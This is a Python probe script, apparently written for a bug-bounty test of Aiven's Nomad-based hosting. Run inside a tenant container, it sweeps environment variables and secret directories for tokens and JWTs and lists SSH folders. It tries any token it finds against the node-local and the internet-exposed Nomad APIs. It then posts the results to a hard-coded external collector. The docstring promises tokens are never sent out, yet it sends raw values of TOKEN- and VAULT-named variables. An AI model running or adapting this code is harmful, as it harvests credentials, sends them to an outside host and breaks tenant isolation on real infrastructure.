#!/usr/bin/env python3
"""probe16 - does an Aiven allocation hold a Nomad workload-identity JWT, and what does it resolve to?

Why: the internet-exposed control plane advertises a JWT-type auth method named `deployment-vault`.
Nomad (1.7+) issues workloads a JWT identity that can be presented as a Bearer token and exchanged
through such an auth method for an ACL token. If our allocation holds one, then a tenant container can
authenticate to that control plane - the first real route out of our own boundary.

Credential discipline: the JWT (if found) is NEVER printed or posted to us. It is only sent to Nomad's
own API over TLS; we record its decoded PUBLIC claims (iss/aud/exp), its length and a sha256 prefix -
never the token. Two probes: the node's local agent (in-container) and the externally exposed server.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt16"
NODE_API = "169.254.1.2"
EXPOSED = "2600:1f16:1527:3700:e5b8:c049:c8c1:3215"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "found": [], "resolve": {}, "identity_files": [], "local": {}}
JWT_RE = re.compile(rb"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}")


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sh(cmd, t=20):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=t)
        return (r.stdout + r.stderr).decode("utf-8", "replace").strip()[:800]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def claims(jwt: bytes):
    try:
        p = jwt.split(b".")[1]
        p += b"=" * (-len(p) % 4)
        d = json.loads(base64.urlsafe_b64decode(p))
        return {k: d.get(k) for k in ("iss", "aud", "sub", "ns", "exp", "iat", "nomad_namespace",
                                      "nomad_task", "nomad_service", "nomad_job_id", "nomad_allocation_id")}
    except Exception as e:                                              # noqa: BLE001
        return {"decode_error": str(e)[:40]}


def api_get(host, path, token=None, timeout=10):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, 4646))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=host)
        head = "GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n" % (path, host, UA)
        if token:
            head += "Authorization: Bearer %s\r\n" % token
        t.sendall((head + "\r\n").encode())
        d = b""
        while len(d) < 3000:
            try:
                c = t.recv(1500)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        t.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:60])


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

RESULTS["local"] = {
    "env_nomad": " | ".join("%s=%s" % (k, v) for k, v in os.environ.items()
                            if any(x in k.upper() for x in ("NOMAD", "VAULT", "IDENTITY", "JWT", "TOKEN")))[:400],
    "env_all_names": " ".join(sorted(os.environ.keys()))[:400],
    "ssh_dir": sh("ls -la /root/.ssh /home/*/.ssh 2>&1 | head -5"),
}

# 1. look for identity material: the paths Nomad uses, plus a content sweep for JWT shape
RESULTS["identity_files"] = sh(
    "for f in /secrets/* /alloc/* /local/* /run/*; do [ -e \"$f\" ] && echo \"$(stat -c '%a %s %n' \"$f\" 2>/dev/null)\"; done 2>/dev/null | head -40")
RESULTS["local"]["alloc_tree"] = sh("find /alloc /local /secrets -maxdepth 3 -type f 2>/dev/null | head -40")
RESULTS["local"]["jwt_sweep"] = sh(
    "grep -rlaE 'eyJ[A-Za-z0-9_-]{8,}\\.[A-Za-z0-9_-]{8,}\\.' /alloc /local /secrets /etc /npm /root 2>/dev/null | head -20")

# 2. any JWT in the environment wins
tokens = []
for k, v in os.environ.items():
    if JWT_RE.match(v.encode() if isinstance(v, str) else v):
        tokens.append(("env:" + k, v))

# 3. if files carried JWTs, read them (we are root; SELinux may still deny)
cand_files = [l for l in (RESULTS["local"]["jwt_sweep"] or "").splitlines() if l.strip()]
for f in cand_files[:10]:
    try:
        with open(f, "r", errors="replace") as fh:
            for m in JWT_RE.finditer(fh.read(200000).encode()):
                tokens.append(("file:" + f, m.group(0).decode()))
                break
    except Exception as e:                                              # noqa: BLE001
        RESULTS["notes"] = RESULTS.get("notes", []) + ["%s: %s" % (f, type(e).__name__)]

seen = set()
uniq = []
for src, tok in tokens:
    if tok in seen:
        continue
    seen.add(tok)
    uniq.append((src, tok))
    RESULTS["found"].append({"source": src, "len": len(tok),
                             "sha256_16": hashlib.sha256(tok.encode()).hexdigest()[:16],
                             "claims": claims(tok.encode())})

# 4. what does it resolve to? one request per identity, to both the node's agent and the exposed server
for i, (_src, tok) in enumerate(uniq[:4]):
    for label, host in (("node-local", NODE_API), ("exposed", EXPOSED)):
        r = api_get(host, "/v1/agent/self", tok)
        line = r.split("\r\n")[0]
        body = r.split("\r\n\r\n", 1)[-1][:400].replace("\n", " ")
        RESULTS["resolve"]["id%d/%s/agent-self" % (i, label)] = "%s :: %s" % (line, body)

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS, indent=1)[:4000])
while True:
    time.sleep(60)
